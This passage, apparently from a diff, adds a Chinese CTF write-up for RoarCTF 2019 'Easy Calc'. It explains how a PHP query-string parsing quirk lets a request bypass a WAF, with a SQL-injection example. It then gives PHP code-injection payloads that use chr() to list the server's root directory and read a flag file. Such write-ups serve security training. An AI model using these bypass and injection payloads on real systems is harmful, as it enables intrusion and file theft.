@@ -120,3 +120,42 @@ else {
    所以，这里的a = = b是返回True
 
    所以这里我们只需要提供一个参数?key=123就可以拿到flag了
+
+# [RoarCTF 2019]Easy Calc 1
+
+## 知识点
+
+我们知道PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
+
+/news.php?%20news[id%00=42"+AND+1=0–
+
+上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
+
+HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+
+1.删除空白符
+
+2.将某些字符转换为下划线（包括空格）
+
+## 解
+
+1. 查看源代码,访问calc.php
+2. 尝试给num传参：发现只能传数字 而不能传字母
+3. 那我们可以利用PHP的字符串解析特性来绕过WAF,在num前面加上空格 
+4. 绕过num传参后，我们要读取他根目录下的文件
+```url
+calc.php? num=print_r(scandir('/'));    
+```
+5. 却发现他没有返回我们想要的答案,发现calc.php中,发现他把  ' '  引号给过滤掉了 ,那就用chr()绕过，chr(47)就是斜杠/     
+```url
+? num=print_r(scandir(chr(47))); 
+```
+6. 输入后可以浏览根目录下的文件，而其中的f1agg就是我们要读取的文件
+```url
+? num=print_r(file_get_contents('/flagg'));
+
+其中/flagg 用chr进行绕过
+
+? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); 
+```
+7. 得到flag
